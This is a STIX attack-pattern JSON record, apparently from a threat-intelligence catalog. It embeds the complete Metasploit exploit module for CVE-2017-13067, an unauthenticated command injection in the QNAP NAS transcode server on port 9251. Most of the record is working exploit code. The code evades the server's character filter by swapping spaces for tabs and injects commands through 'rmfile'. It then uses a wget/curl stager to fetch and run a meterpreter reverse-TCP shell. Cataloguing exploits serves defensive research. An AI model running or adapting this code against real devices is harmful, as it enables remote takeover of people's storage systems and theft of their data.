{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e9eb5c62-dbc0-4874-a682-9d232ae4e7a8",
    "created": "2024-08-14T16:57:35.736954Z",
    "modified": "2024-08-14T16:57:35.736958Z",
    "name": "QNAP Transcode Server Command Execution",
    "description": " This module exploits an unauthenticated remote command injection vulnerability in QNAP NAS devices. The transcoding server listens on port 9251 by default and is vulnerable to command injection using the 'rmfile' command.  This module was tested successfully on a QNAP TS-431 with firmware version 4.3.3.0262 (20170727). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/qnap_transcode_server.rb",
            "external_id": "qnap_transcode_server.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-13067"
        },
        {
            "source_name": "reference",
            "url": "https://www.exploitee.rs/index.php/QNAP_TS-131"
        },
        {
            "source_name": "reference",
            "url": "http://docs.qnap.com/nas/4.1/Home/en/index.html?transcode_management.htm"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'QNAP Transcode Server Command Execution',\n      'Description' => %q{\n        This module exploits an unauthenticated remote command injection\n        vulnerability in QNAP NAS devices. The transcoding server listens\n        on port 9251 by default and is vulnerable to command injection\n        using the 'rmfile' command.\n\n        This module was tested successfully on a QNAP TS-431 with\n        firmware version 4.3.3.0262 (20170727).\n      },\n      'Author'     =>\n        [\n          'Zenofex', # Initial vulnerability discovery and PoC\n          '0x00string', # Initial vulnerability discovery and PoC\n          'bcoles' # Metasploit\n        ],\n      'License'    => MSF_LICENSE,\n      'Platform'   => 'linux',\n      'References' =>\n        [\n          [ 'CVE', '2017-13067' ],\n          [ 'URL', 'https://www.exploitee.rs/index.php/QNAP_TS-131' ],\n          [ 'URL', 'http://docs.qnap.com/nas/4.1/Home/en/index.html?transcode_management.htm' ]\n        ],\n      'DisclosureDate'  => '2017-08-06',\n      'Privileged'      => true,\n      'Arch'            => ARCH_ARMLE,\n      'DefaultOptions'  =>\n        {\n          'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp'\n        },\n      'Targets'         => [['Automatic', {}]],\n      'CmdStagerFlavor' => %w{wget curl},\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        Opt::RPORT(9251),\n        OptInt.new('DELAY', [true, 'How long to wait for the device to download the payload', 30])\n      ])\n    deregister_options 'cmdstager::decoder'\n  end\n\n  def check\n    vprint_status 'Connecting to transcode server...'\n\n    connect\n    sock.put \"\\x01\\x00\\x00\\x00\"\n    res = sock.get_once\n\n    if res.blank?\n      vprint_status 'No reply from server'\n      return CheckCode::Safe\n    end\n\n    vprint_status \"Received response: #{res}\"\n\n    return CheckCode::Detected if res.to_s =~ /client's request is accepted/\n\n    CheckCode::Safe\n  rescue ::Rex::ConnectionError\n    vprint_error 'Connection failed'\n    return CheckCode::Unknown\n  ensure\n    disconnect\n  end\n\n  def execute_command(cmd, opts)\n    # Filtered characters: 0x20 ! $ & 0x39 , ; = [ ] ^ ` { } %\n    # Execute each command seperately\n    cmd.split(';').each do |c|\n      connect\n      vprint_status \"Executing command: #{c}\"\n\n      # Replace spaces with tabs\n      c.tr! ' ', \"\\t\"\n\n      sock.put \"\\x01\\x00\\x00\\x00/|#{c}|\\x00\"\n      res = sock.get_once\n\n      unless res.to_s =~ /client's request is accepted/\n        print_status 'Unexpected reply'\n        break\n      end\n\n      print_status \"Sent command successfully (#{c.length} bytes)\"\n\n      disconnect\n\n      if c =~ /^(curl|wget)/\n        print_status \"Waiting for the device to download the payload (#{datastore['DELAY']} seconds)...\"\n        Rex.sleep datastore['DELAY']\n      end\n    end\n  rescue ::Rex::ConnectionError\n    fail_with Failure::Unreachable, 'Failed to connect to the transcode server'\n  ensure\n    disconnect\n  end\n\n  def exploit\n    vprint_status 'Connecting to transcode server...'\n    execute_cmdstager linemax: 400\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-08-06",
    "x_mitre_platforms": [
        "linux'"
    ]
}